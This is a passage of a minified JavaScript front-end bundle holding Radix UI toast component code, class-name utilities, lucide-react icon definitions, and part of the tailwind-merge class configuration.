              ref: m,
              style: {
                userSelect: "none",
                touchAction: "none",
                ...e.style
              },
              onKeyDown: bt(e.onKeyDown, z => {
                z.key === "Escape" && (l == null || l(z.nativeEvent),
                  z.nativeEvent.defaultPrevented || (v.isFocusedToastEscapeKeyDownRef.current = !0,
                    q()))
              }
              ),
              onPointerDown: bt(e.onPointerDown, z => {
                z.button === 0 && (p.current = {
                  x: z.clientX,
                  y: z.clientY
                })
              }
              ),
              onPointerMove: bt(e.onPointerMove, z => {
                if (!p.current)
                  return;
                const te = z.clientX - p.current.x
                  , se = z.clientY - p.current.y
                  , X = !!w.current
                  , O = ["left", "right"].includes(v.swipeDirection)
                  , R = ["left", "up"].includes(v.swipeDirection) ? Math.min : Math.max
                  , L = O ? R(0, te) : 0
                  , J = O ? 0 : R(0, se)
                  , oe = z.pointerType === "touch" ? 10 : 2
                  , $e = {
                    x: L,
                    y: J
                  }
                  , He = {
                    originalEvent: z,
                    delta: $e
                  };
                X ? (w.current = $e,
                  pa(LC, f, He, {
                    discrete: !1
                  })) : sp($e, v.swipeDirection, oe) ? (w.current = $e,
                    pa(_C, d, He, {
                      discrete: !1
                    }),
                    z.target.setPointerCapture(z.pointerId)) : (Math.abs(te) > oe || Math.abs(se) > oe) && (p.current = null)
              }
              ),
              onPointerUp: bt(e.onPointerUp, z => {
                const te = w.current
                  , se = z.target;
                if (se.hasPointerCapture(z.pointerId) && se.releasePointerCapture(z.pointerId),
                  w.current = null,
                  p.current = null,
                  te) {
                  const X = z.currentTarget
                    , O = {
                      originalEvent: z,
                      delta: te
                    };
                  sp(te, v.swipeDirection, v.swipeThreshold) ? pa(VC, y, O, {
                    discrete: !0
                  }) : pa(FC, h, O, {
                    discrete: !0
                  }),
                    X.addEventListener("click", R => R.preventDefault(), {
                      once: !0
                    })
                }
              }
              )
            })
          })
        }), v.viewport)
      })]
    }) : null
  }
  )
  , $C = e => {
    const { __scopeToast: t, children: n, ...r } = e
      , s = ql(Gl, t)
      , [o, i] = x.useState(!1)
      , [l, c] = x.useState(!1);
    return QC(() => i(!0)),
      x.useEffect(() => {
        const u = window.setTimeout(() => c(!0), 1e3);
        return () => window.clearTimeout(u)
      }
        , []),
      l ? null : a.jsx(Vv, {
        asChild: !0,
        children: a.jsx(Ff, {
          ...r,
          children: o && a.jsxs(a.Fragment, {
            children: [s.label, " ", n]
          })
        })
      })
  }
  , HC = "ToastTitle"
  , qv = x.forwardRef((e, t) => {
    const { __scopeToast: n, ...r } = e;
    return a.jsx(yn.div, {
      ...r,
      ref: t
    })
  }
  );
qv.displayName = HC;
var WC = "ToastDescription"
  , Gv = x.forwardRef((e, t) => {
    const { __scopeToast: n, ...r } = e;
    return a.jsx(yn.div, {
      ...r,
      ref: t
    })
  }
  );
Gv.displayName = WC;
var Kv = "ToastAction"
  , Yv = x.forwardRef((e, t) => {
    const { altText: n, ...r } = e;
    return n.trim() ? a.jsx(Jv, {
      altText: n,
      asChild: !0,
      children: a.jsx(zf, {
        ...r,
        ref: t
      })
    }) : (console.error(`Invalid prop \`altText\` supplied to \`${Kv}\`. Expected non-empty \`string\`.`),
      null)
  }
  );
Yv.displayName = Kv;
var Xv = "ToastClose"
  , zf = x.forwardRef((e, t) => {
    const { __scopeToast: n, ...r } = e
      , s = zC(Xv, n);
    return a.jsx(Jv, {
      asChild: !0,
      children: a.jsx(yn.button, {
        type: "button",
        ...r,
        ref: t,
        onClick: bt(e.onClick, s.onClose)
      })
    })
  }
  );
zf.displayName = Xv;
var Jv = x.forwardRef((e, t) => {
  const { __scopeToast: n, altText: r, ...s } = e;
  return a.jsx(yn.div, {
    "data-radix-toast-announce-exclude": "",
    "data-radix-toast-announce-alt": r || void 0,
    ...s,
    ref: t
  })
}
);
function Zv(e) {
  const t = [];
  return Array.from(e.childNodes).forEach(r => {
    if (r.nodeType === r.TEXT_NODE && r.textContent && t.push(r.textContent),
      qC(r)) {
      const s = r.ariaHidden || r.hidden || r.style.display === "none"
        , o = r.dataset.radixToastAnnounceExclude === "";
      if (!s)
        if (o) {
          const i = r.dataset.radixToastAnnounceAlt;
          i && t.push(i)
        } else
          t.push(...Zv(r))
    }
  }
  ),
    t
}
function pa(e, t, n, { discrete: r }) {
  const s = n.originalEvent.currentTarget
    , o = new CustomEvent(e, {
      bubbles: !0,
      cancelable: !0,
      detail: n
    });
  t && s.addEventListener(e, t, {
    once: !0
  }),
    r ? Ov(s, o) : s.dispatchEvent(o)
}
var sp = (e, t, n = 0) => {
  const r = Math.abs(e.x)
    , s = Math.abs(e.y)
    , o = r > s;
  return t === "left" || t === "right" ? o && r > n : !o && s > n
}
  ;
function QC(e = () => { }
) {
  const t = Vn(e);
  fl(() => {
    let n = 0
      , r = 0;
    return n = window.requestAnimationFrame(() => r = window.requestAnimationFrame(t)),
      () => {
        window.cancelAnimationFrame(n),
          window.cancelAnimationFrame(r)
      }
  }
    , [t])
}
function qC(e) {
  return e.nodeType === e.ELEMENT_NODE
}
function GC(e) {
  const t = []
    , n = document.createTreeWalker(e, NodeFilter.SHOW_ELEMENT, {
      acceptNode: r => {
        const s = r.tagName === "INPUT" && r.type === "hidden";
        return r.disabled || r.hidden || s ? NodeFilter.FILTER_SKIP : r.tabIndex >= 0 ? NodeFilter.FILTER_ACCEPT : NodeFilter.FILTER_SKIP
      }
    });
  for (; n.nextNode();)
    t.push(n.currentNode);
  return t
}
function qc(e) {
  const t = document.activeElement;
  return e.some(n => n === t ? !0 : (n.focus(),
    document.activeElement !== t))
}
var KC = Uv
  , ex = Hv
  , tx = Qv
  , nx = qv
  , rx = Gv
  , sx = Yv
  , ox = zf;
function ix(e) {
  var t, n, r = "";
  if (typeof e == "string" || typeof e == "number")
    r += e;
  else if (typeof e == "object")
    if (Array.isArray(e))
      for (t = 0; t < e.length; t++)
        e[t] && (n = ix(e[t])) && (r && (r += " "),
          r += n);
    else
      for (t in e)
        e[t] && (r && (r += " "),
          r += t);
  return r
}
function YC() {
  for (var e, t, n = 0, r = ""; n < arguments.length;)
    (e = arguments[n++]) && (t = ix(e)) && (r && (r += " "),
      r += t);
  return r
}
const op = e => typeof e == "boolean" ? "".concat(e) : e === 0 ? "0" : e
  , ip = YC
  , ax = (e, t) => n => {
    var r;
    if ((t == null ? void 0 : t.variants) == null)
      return ip(e, n == null ? void 0 : n.class, n == null ? void 0 : n.className);
    const { variants: s, defaultVariants: o } = t
      , i = Object.keys(s).map(u => {
        const d = n == null ? void 0 : n[u]
          , f = o == null ? void 0 : o[u];
        if (d === null)
          return null;
        const h = op(d) || op(f);
        return s[u][h]
      }
      )
      , l = n && Object.entries(n).reduce((u, d) => {
        let [f, h] = d;
        return h === void 0 || (u[f] = h),
          u
      }
        , {})
      , c = t == null || (r = t.compoundVariants) === null || r === void 0 ? void 0 : r.reduce((u, d) => {
        let { class: f, className: h, ...y } = d;
        return Object.entries(y).every(b => {
          let [v, C] = b;
          return Array.isArray(C) ? C.includes({
            ...o,
            ...l
          }[v]) : {
            ...o,
            ...l
          }[v] === C
        }
        ) ? [...u, f, h] : u
      }
        , []);
    return ip(e, i, c, n == null ? void 0 : n.class, n == null ? void 0 : n.className)
  }
  ;
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const XC = e => e.replace(/([a-z0-9])([A-Z])/g, "$1-$2").toLowerCase()
  , lx = (...e) => e.filter((t, n, r) => !!t && r.indexOf(t) === n).join(" ");
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
var JC = {
  xmlns: "http://www.w3.org/2000/svg",
  width: 24,
  height: 24,
  viewBox: "0 0 24 24",
  fill: "none",
  stroke: "currentColor",
  strokeWidth: 2,
  strokeLinecap: "round",
  strokeLinejoin: "round"
};
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const ZC = x.forwardRef(({ color: e = "currentColor", size: t = 24, strokeWidth: n = 2, absoluteStrokeWidth: r, className: s = "", children: o, iconNode: i, ...l }, c) => x.createElement("svg", {
  ref: c,
  ...JC,
  width: t,
  height: t,
  stroke: e,
  strokeWidth: r ? Number(n) * 24 / Number(t) : n,
  className: lx("lucide", s),
  ...l
}, [...i.map(([u, d]) => x.createElement(u, d)), ...Array.isArray(o) ? o : [o]]));
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const pt = (e, t) => {
  const n = x.forwardRef(({ className: r, ...s }, o) => x.createElement(ZC, {
    ref: o,
    iconNode: t,
    className: lx(`lucide-${XC(e)}`, r),
    ...s
  }));
  return n.displayName = `${e}`,
    n
}
  ;
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Ft = pt("Check", [["path", {
  d: "M20 6 9 17l-5-5",
  key: "1gmf2c"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const eN = pt("ChevronRight", [["path", {
  d: "m9 18 6-6-6-6",
  key: "mthhwq"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const tN = pt("CircleAlert", [["circle", {
  cx: "12",
  cy: "12",
  r: "10",
  key: "1mglay"
}], ["line", {
  x1: "12",
  x2: "12",
  y1: "8",
  y2: "12",
  key: "1pkeuh"
}], ["line", {
  x1: "12",
  x2: "12.01",
  y1: "16",
  y2: "16",
  key: "4dfq90"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const nN = pt("Clock", [["circle", {
  cx: "12",
  cy: "12",
  r: "10",
  key: "1mglay"
}], ["polyline", {
  points: "12 6 12 12 16 14",
  key: "68esgv"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const Kl = pt("Copy", [["rect", {
  width: "14",
  height: "14",
  x: "8",
  y: "8",
  rx: "2",
  ry: "2",
  key: "17jyea"
}], ["path", {
  d: "M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2",
  key: "zix9uf"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const rN = pt("Download", [["path", {
  d: "M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4",
  key: "ih7n3h"
}], ["polyline", {
  points: "7 10 12 15 17 10",
  key: "2ggqvy"
}], ["line", {
  x1: "12",
  x2: "12",
  y1: "15",
  y2: "3",
  key: "1vk2je"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const sN = pt("Eye", [["path", {
  d: "M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0",
  key: "1nclc0"
}], ["circle", {
  cx: "12",
  cy: "12",
  r: "3",
  key: "1v7zrd"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const oN = pt("FileText", [["path", {
  d: "M15 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7Z",
  key: "1rqfz7"
}], ["path", {
  d: "M14 2v4a2 2 0 0 0 2 2h4",
  key: "tnqrlb"
}], ["path", {
  d: "M10 9H8",
  key: "b1mrlr"
}], ["path", {
  d: "M16 13H8",
  key: "t4e002"
}], ["path", {
  d: "M16 17H8",
  key: "z1uh3a"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const dt = pt("LoaderCircle", [["path", {
  d: "M21 12a9 9 0 1 1-6.219-8.56",
  key: "13zald"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const iN = pt("QrCode", [["rect", {
  width: "5",
  height: "5",
  x: "3",
  y: "3",
  rx: "1",
  key: "1tu5fj"
}], ["rect", {
  width: "5",
  height: "5",
  x: "16",
  y: "3",
  rx: "1",
  key: "1v8r4q"
}], ["rect", {
  width: "5",
  height: "5",
  x: "3",
  y: "16",
  rx: "1",
  key: "1x03jg"
}], ["path", {
  d: "M21 16h-3a2 2 0 0 0-2 2v3",
  key: "177gqh"
}], ["path", {
  d: "M21 21v.01",
  key: "ents32"
}], ["path", {
  d: "M12 7v3a2 2 0 0 1-2 2H7",
  key: "8crl2c"
}], ["path", {
  d: "M3 12h.01",
  key: "nlz23k"
}], ["path", {
  d: "M12 3h.01",
  key: "n36tog"
}], ["path", {
  d: "M12 16v.01",
  key: "133mhm"
}], ["path", {
  d: "M16 12h1",
  key: "1slzba"
}], ["path", {
  d: "M21 12v.01",
  key: "1lwtk9"
}], ["path", {
  d: "M12 21v-1",
  key: "1880an"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const aN = pt("RefreshCw", [["path", {
  d: "M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8",
  key: "v9h5vc"
}], ["path", {
  d: "M21 3v5h-5",
  key: "1q7to0"
}], ["path", {
  d: "M21 12a9 9 0 0 1-9 9 9.75 9.75 0 0 1-6.74-2.74L3 16",
  key: "3uifl3"
}], ["path", {
  d: "M8 16H3v5",
  key: "1cv678"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const ap = pt("TriangleAlert", [["path", {
  d: "m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3",
  key: "wmoenq"
}], ["path", {
  d: "M12 9v4",
  key: "juzpu7"
}], ["path", {
  d: "M12 17h.01",
  key: "p32p05"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const lN = pt("Upload", [["path", {
  d: "M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4",
  key: "ih7n3h"
}], ["polyline", {
  points: "17 8 12 3 7 8",
  key: "t8dd8p"
}], ["line", {
  x1: "12",
  x2: "12",
  y1: "3",
  y2: "15",
  key: "widbto"
}]]);
/**
 * @license lucide-react v0.453.0 - ISC
 *
 * This source code is licensed under the ISC license.
 * See the LICENSE file in the root directory of this source tree.
 */
const cx = pt("X", [["path", {
  d: "M18 6 6 18",
  key: "1bl5f8"
}], ["path", {
  d: "m6 6 12 12",
  key: "d8bk6v"
}]]);
function ux(e) {
  var t, n, r = "";
  if (typeof e == "string" || typeof e == "number")
    r += e;
  else if (typeof e == "object")
    if (Array.isArray(e)) {
      var s = e.length;
      for (t = 0; t < s; t++)
        e[t] && (n = ux(e[t])) && (r && (r += " "),
          r += n)
    } else
      for (n in e)
        e[n] && (r && (r += " "),
          r += n);
  return r
}
function cN() {
  for (var e, t, n = 0, r = "", s = arguments.length; n < s; n++)
    (e = arguments[n]) && (t = ux(e)) && (r && (r += " "),
      r += t);
  return r
}
const Uf = "-"
  , uN = e => {
    const t = fN(e)
      , { conflictingClassGroups: n, conflictingClassGroupModifiers: r } = e;
    return {
      getClassGroupId: i => {
        const l = i.split(Uf);
        return l[0] === "" && l.length !== 1 && l.shift(),
          dx(l, t) || dN(i)
      }
      ,
      getConflictingClassGroupIds: (i, l) => {
        const c = n[i] || [];
        return l && r[i] ? [...c, ...r[i]] : c
      }
    }
  }
  , dx = (e, t) => {
    var i;
    if (e.length === 0)
      return t.classGroupId;
    const n = e[0]
      , r = t.nextPart.get(n)
      , s = r ? dx(e.slice(1), r) : void 0;
    if (s)
      return s;
    if (t.validators.length === 0)
      return;
    const o = e.join(Uf);
    return (i = t.validators.find(({ validator: l }) => l(o))) == null ? void 0 : i.classGroupId
  }
  , lp = /^\[(.+)\]$/
  , dN = e => {
    if (lp.test(e)) {
      const t = lp.exec(e)[1]
        , n = t == null ? void 0 : t.substring(0, t.indexOf(":"));
      if (n)
        return "arbitrary.." + n
    }
  }
  , fN = e => {
    const { theme: t, prefix: n } = e
      , r = {
        nextPart: new Map,
        validators: []
      };
    return mN(Object.entries(e.classGroups), n).forEach(([o, i]) => {
      vd(i, r, o, t)
    }
    ),
      r
  }
  , vd = (e, t, n, r) => {
    e.forEach(s => {
      if (typeof s == "string") {
        const o = s === "" ? t : cp(t, s);
        o.classGroupId = n;
        return
      }
      if (typeof s == "function") {
        if (hN(s)) {
          vd(s(r), t, n, r);
          return
        }
        t.validators.push({
          validator: s,
          classGroupId: n
        });
        return
      }
      Object.entries(s).forEach(([o, i]) => {
        vd(i, cp(t, o), n, r)
      }
      )
    }
    )
  }
  , cp = (e, t) => {
    let n = e;
    return t.split(Uf).forEach(r => {
      n.nextPart.has(r) || n.nextPart.set(r, {
        nextPart: new Map,
        validators: []
      }),
        n = n.nextPart.get(r)
    }
    ),
      n
  }
  , hN = e => e.isThemeGetter
  , mN = (e, t) => t ? e.map(([n, r]) => {
    const s = r.map(o => typeof o == "string" ? t + o : typeof o == "object" ? Object.fromEntries(Object.entries(o).map(([i, l]) => [t + i, l])) : o);
    return [n, s]
  }
  ) : e
  , pN = e => {
    if (e < 1)
      return {
        get: () => { }
        ,
        set: () => { }
      };
    let t = 0
      , n = new Map
      , r = new Map;
    const s = (o, i) => {
      n.set(o, i),
        t++,
        t > e && (t = 0,
          r = n,
          n = new Map)
    }
      ;
    return {
      get(o) {
        let i = n.get(o);
        if (i !== void 0)
          return i;
        if ((i = r.get(o)) !== void 0)
          return s(o, i),
            i
      },
      set(o, i) {
        n.has(o) ? n.set(o, i) : s(o, i)
      }
    }
  }
  , fx = "!"
  , gN = e => {
    const { separator: t, experimentalParseClassName: n } = e
      , r = t.length === 1
      , s = t[0]
      , o = t.length
      , i = l => {
        const c = [];
        let u = 0, d = 0, f;
        for (let C = 0; C < l.length; C++) {
          let g = l[C];
          if (u === 0) {
            if (g === s && (r || l.slice(C, C + o) === t)) {
              c.push(l.slice(d, C)),
                d = C + o;
              continue
            }
            if (g === "/") {
              f = C;
              continue
            }
          }
          g === "[" ? u++ : g === "]" && u--
        }
        const h = c.length === 0 ? l : l.substring(d)
          , y = h.startsWith(fx)
          , b = y ? h.substring(1) : h
          , v = f && f > d ? f - d : void 0;
        return {
          modifiers: c,
          hasImportantModifier: y,
          baseClassName: b,
          maybePostfixModifierPosition: v
        }
      }
      ;
    return n ? l => n({
      className: l,
      parseClassName: i
    }) : i
  }
  , yN = e => {
    if (e.length <= 1)
      return e;
    const t = [];
    let n = [];
    return e.forEach(r => {
      r[0] === "[" ? (t.push(...n.sort(), r),
        n = []) : n.push(r)
    }
    ),
      t.push(...n.sort()),
      t
  }
  , vN = e => ({
    cache: pN(e.cacheSize),
    parseClassName: gN(e),
    ...uN(e)
  })
  , xN = /\s+/
  , wN = (e, t) => {
    const { parseClassName: n, getClassGroupId: r, getConflictingClassGroupIds: s } = t
      , o = []
      , i = e.trim().split(xN);
    let l = "";
    for (let c = i.length - 1; c >= 0; c -= 1) {
      const u = i[c]
        , { modifiers: d, hasImportantModifier: f, baseClassName: h, maybePostfixModifierPosition: y } = n(u);
      let b = !!y
        , v = r(b ? h.substring(0, y) : h);
      if (!v) {
        if (!b) {
          l = u + (l.length > 0 ? " " + l : l);
          continue
        }
        if (v = r(h),
          !v) {
          l = u + (l.length > 0 ? " " + l : l);
          continue
        }
        b = !1
      }
      const C = yN(d).join(":")
        , g = f ? C + fx : C
        , m = g + v;
      if (o.includes(m))
        continue;
      o.push(m);
      const p = s(v, b);
      for (let w = 0; w < p.length; ++w) {
        const S = p[w];
        o.push(g + S)
      }
      l = u + (l.length > 0 ? " " + l : l)
    }
    return l
  }
  ;
function bN() {
  let e = 0, t, n, r = "";
  for (; e < arguments.length;)
    (t = arguments[e++]) && (n = hx(t)) && (r && (r += " "),
      r += n);
  return r
}
const hx = e => {
  if (typeof e == "string")
    return e;
  let t, n = "";
  for (let r = 0; r < e.length; r++)
    e[r] && (t = hx(e[r])) && (n && (n += " "),
      n += t);
  return n
}
  ;
function SN(e, ...t) {
  let n, r, s, o = i;
  function i(c) {
    const u = t.reduce((d, f) => f(d), e());
    return n = vN(u),
      r = n.cache.get,
      s = n.cache.set,
      o = l,
      l(c)
  }
  function l(c) {
    const u = r(c);
    if (u)
      return u;
    const d = wN(c, n);
    return s(c, d),
      d
  }
  return function () {
    return o(bN.apply(null, arguments))
  }
}
const me = e => {
  const t = n => n[e] || [];
  return t.isThemeGetter = !0,
    t
}
  , mx = /^\[(?:([a-z-]+):)?(.+)\]$/i
  , CN = /^\d+\/\d+$/
  , NN = new Set(["px", "full", "screen"])
  , jN = /^(\d+(\.\d+)?)?(xs|sm|md|lg|xl)$/
  , PN = /\d+(%|px|r?em|[sdl]?v([hwib]|min|max)|pt|pc|in|cm|mm|cap|ch|ex|r?lh|cq(w|h|i|b|min|max))|\b(calc|min|max|clamp)\(.+\)|^0$/
  , AN = /^(rgba?|hsla?|hwb|(ok)?(lab|lch))\(.+\)$/
  , EN = /^(inset_)?-?((\d+)?\.?(\d+)[a-z]+|0)_-?((\d+)?\.?(\d+)[a-z]+|0)/
  , TN = /^(url|image|image-set|cross-fade|element|(repeating-)?(linear|radial|conic)-gradient)\(.+\)$/
  , wn = e => Os(e) || NN.has(e) || CN.test(e)
  , Qn = e => co(e, "length", LN)
  , Os = e => !!e && !Number.isNaN(Number(e))
  , Gc = e => co(e, "number", Os)
  , Ao = e => !!e && Number.isInteger(Number(e))
  , kN = e => e.endsWith("%") && Os(e.slice(0, -1))
  , ee = e => mx.test(e)
  , qn = e => jN.test(e)
  , DN = new Set(["length", "size", "percentage"])
  , MN = e => co(e, DN, px)
  , RN = e => co(e, "position", px)
  , ON = new Set(["image", "url"])
  , IN = e => co(e, ON, VN)
  , _N = e => co(e, "", FN)
  , Eo = () => !0
  , co = (e, t, n) => {
    const r = mx.exec(e);
    return r ? r[1] ? typeof t == "string" ? r[1] === t : t.has(r[1]) : n(r[2]) : !1
  }
  , LN = e => PN.test(e) && !AN.test(e)
  , px = () => !1
  , FN = e => EN.test(e)
  , VN = e => TN.test(e)
  , BN = () => {
    const e = me("colors")
      , t = me("spacing")
      , n = me("blur")
      , r = me("brightness")
      , s = me("borderColor")
      , o = me("borderRadius")
      , i = me("borderSpacing")
      , l = me("borderWidth")
      , c = me("contrast")
      , u = me("grayscale")
      , d = me("hueRotate")
      , f = me("invert")
      , h = me("gap")
      , y = me("gradientColorStops")
      , b = me("gradientColorStopPositions")
      , v = me("inset")
      , C = me("margin")
      , g = me("opacity")
      , m = me("padding")
      , p = me("saturate")
      , w = me("scale")
      , S = me("sepia")
      , N = me("skew")
      , P = me("space")
      , A = me("translate")
      , k = () => ["auto", "contain", "none"]
      , D = () => ["auto", "hidden", "clip", "visible", "scroll"]
      , q = () => ["auto", ee, t]
      , I = () => [ee, t]
      , H = () => ["", wn, Qn]
      , z = () => ["auto", Os, ee]
      , te = () => ["bottom", "center", "left", "left-bottom", "left-top", "right", "right-bottom", "right-top", "top"]
      , se = () => ["solid", "dashed", "dotted", "double", "none"]
      , X = () => ["normal", "multiply", "screen", "overlay", "darken", "lighten", "color-dodge", "color-burn", "hard-light", "soft-light", "difference", "exclusion", "hue", "saturation", "color", "luminosity"]
      , O = () => ["start", "end", "center", "between", "around", "evenly", "stretch"]
      , R = () => ["", "0", ee]
      , L = () => ["auto", "avoid", "all", "avoid-page", "page", "left", "right", "column"]
      , J = () => [Os, ee];
    return {
      cacheSize: 500,
      separator: ":",
      theme: {
        colors: [Eo],
        spacing: [wn, Qn],
        blur: ["none", "", qn, ee],
        brightness: J(),
        borderColor: [e],
        borderRadius: ["none", "", "full", qn, ee],
        borderSpacing: I(),
        borderWidth: H(),
        contrast: J(),
        grayscale: R(),
        hueRotate: J(),
        invert: R(),
        gap: I(),
        gradientColorStops: [e],
        gradientColorStopPositions: [kN, Qn],
        inset: q(),
        margin: q(),
        opacity: J(),
        padding: I(),
        saturate: J(),
        scale: J(),
        sepia: R(),
        skew: J(),
        space: I(),
        translate: I()
      },
      classGroups: {
        aspect: [{
          aspect: ["auto", "square", "video", ee]
        }],
        container: ["container"],
        columns: [{
          columns: [qn]
        }],
        "break-after": [{
          "break-after": L()
        }],
        "break-before": [{
          "break-before": L()
        }],
        "break-inside": [{
          "break-inside": ["auto", "avoid", "avoid-page", "avoid-column"]
        }],
        "box-decoration": [{
          "box-decoration": ["slice", "clone"]
        }],
        box: [{
          box: ["border", "content"]
        }],
        display: ["block", "inline-block", "inline", "flex", "inline-flex", "table", "inline-table", "table-caption", "table-cell", "table-column", "table-column-group", "table-footer-group", "table-header-group", "table-row-group", "table-row", "flow-root", "grid", "inline-grid", "contents", "list-item", "hidden"],
        float: [{
          float: ["right", "left", "none", "start", "end"]
        }],
        clear: [{
          clear: ["left", "right", "both", "none", "start", "end"]
        }],
        isolation: ["isolate", "isolation-auto"],
        "object-fit": [{
          object: ["contain", "cover", "fill", "none", "scale-down"]
        }],
        "object-position": [{
          object: [...te(), ee]
        }],
        overflow: [{
          overflow: D()
        }],
        "overflow-x": [{
          "overflow-x": D()
        }],
        "overflow-y": [{
          "overflow-y": D()
        }],
        overscroll: [{
          overscroll: k()
        }],
        "overscroll-x": [{
          "overscroll-x": k()
        }],
        "overscroll-y": [{
          "overscroll-y": k()
        }],
        position: ["static", "fixed", "absolute", "relative", "sticky"],
        inset: [{
          inset: [v]
        }],
        "inset-x": [{
          "inset-x": [v]
        }],
        "inset-y": [{
          "inset-y": [v]
        }],
        start: [{
          start: [v]
        }],
        end: [{
          end: [v]
        }],
        top: [{
          top: [v]
        }],
        right: [{
          right: [v]
        }],
        bottom: [{
          bottom: [v]
        }],
        left: [{
          left: [v]
        }],
        visibility: ["visible", "invisible", "collapse"],
        z: [{
          z: ["auto", Ao, ee]
        }],
        basis: [{
          basis: q()
        }],
        "flex-direction": [{
          flex: ["row", "row-reverse", "col", "col-reverse"]
        }],
        "flex-wrap": [{
          flex: ["wrap", "wrap-reverse", "nowrap"]
        }],
        flex: [{
          flex: ["1", "auto", "initial", "none", ee]
        }],
        grow: [{
          grow: R()
        }],
        shrink: [{
          shrink: R()
        }],
        order: [{
          order: ["first", "last", "none", Ao, ee]
        }],
        "grid-cols": [{
          "grid-cols": [Eo]
        }],
        "col-start-end": [{
          col: ["auto", {
            span: ["full", Ao, ee]
          }, ee]
        }],
        "col-start": [{
          "col-start": z()
        }],
        "col-end": [{
          "col-end": z()
        }],
        "grid-rows": [{
          "grid-rows": [Eo]
        }],
        "row-start-end": [{
          row: ["auto", {
            span: [Ao, ee]
          }, ee]
        }],
        "row-start": [{
          "row-start": z()
        }],
        "row-end": [{
          "row-end": z()
        }],
        "grid-flow": [{
          "grid-flow": ["row", "col", "dense", "row-dense", "col-dense"]
        }],
        "auto-cols": [{
          "auto-cols": ["auto", "min", "max", "fr", ee]
        }],
        "auto-rows": [{
          "auto-rows": ["auto", "min", "max", "fr", ee]
        }],
        gap: [{
          gap: [h]
        }],
        "gap-x": [{
          "gap-x": [h]
        }],
        "gap-y": [{
          "gap-y": [h]
        }],
        "justify-content": [{
          justify: ["normal", ...O()]
        }],
        "justify-items": [{
          "justify-items": ["start", "end", "center", "stretch"]
        }],
        "justify-self": [{
          "justify-self": ["auto", "start", "end", "center", "stretch"]
        }],
        "align-content": [{
          content: ["normal", ...O(), "baseline"]
        }],
        "align-items": [{
          items: ["start", "end", "center", "baseline", "stretch"]
        }],
        "align-self": [{
          self: ["auto", "start", "end", "center", "stretch", "baseline"]
        }],
        "place-content": [{
          "place-content": [...O(), "baseline"]
        }],
        "place-items": [{
          "place-items": ["start", "end", "center", "baseline", "stretch"]
        }],
        "place-self": [{
          "place-self": ["auto", "start", "end", "center", "stretch"]
        }],
        p: [{
          p: [m]
        }],
        px: [{
          px: [m]
        }],
        py: [{
          py: [m]
        }],
        ps: [{
          ps: [m]
        }],
        pe: [{
          pe: [m]
        }],
        pt: [{
          pt: [m]
        }],
        pr: [{
          pr: [m]
        }],
        pb: [{
          pb: [m]
        }],
        pl: [{
          pl: [m]
        }],
        m: [{
          m: [C]
        }],
        mx: [{
          mx: [C]
        }],
        my: [{
          my: [C]
        }],
        ms: [{
          ms: [C]
        }],
        me: [{
          me: [C]
        }],
        mt: [{
          mt: [C]
        }],
        mr: [{
          mr: [C]
        }],
        mb: [{
          mb: [C]
        }],
        ml: [{
          ml: [C]
        }],
        "space-x": [{
          "space-x": [P]
        }],
        "space-x-reverse": ["space-x-reverse"],
        "space-y": [{
          "space-y": [P]
        }],
        "space-y-reverse": ["space-y-reverse"],
        w: [{
          w: ["auto", "min", "max", "fit", "svw", "lvw", "dvw", ee, t]
        }],
        "min-w": [{
          "min-w": [ee, t, "min", "max", "fit"]
        }],
        "max-w": [{
          "max-w": [ee, t, "none", "full", "min", "max", "fit", "prose", {
            screen: [qn]
          }, qn]
        }],
        h: [{
          h: [ee, t, "auto", "min", "max", "fit", "svh", "lvh", "dvh"]
